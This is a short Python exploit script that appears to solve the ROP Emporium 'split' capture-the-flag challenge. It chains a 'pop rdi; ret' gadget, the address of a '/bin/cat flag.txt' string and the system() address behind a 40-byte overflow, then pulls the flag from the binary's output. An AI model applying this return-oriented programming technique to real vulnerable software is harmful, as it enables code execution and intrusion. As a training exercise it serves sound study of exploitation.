import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./split"

# rabin2 -i ./split | grep "system" | awk '{print $2}'
SYSTEM_ADDR = struct.pack("<Q", 0x00400560)
# rabin2 -z ./split | grep "/bin/cat flag.txt" | aws '{print $3}'
CMD_STR_ADDR = struct.pack("<Q", 0x00601060)
# ROPgadget --binary ./split | grep "pop rdi ; ret" | awk '{print $1}'
POP_RDI_ADDR = struct.pack("<Q", 0x00000000004007C3)

JUNK = b"A" * 40

payload = JUNK + POP_RDI_ADDR + CMD_STR_ADDR + SYSTEM_ADDR

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
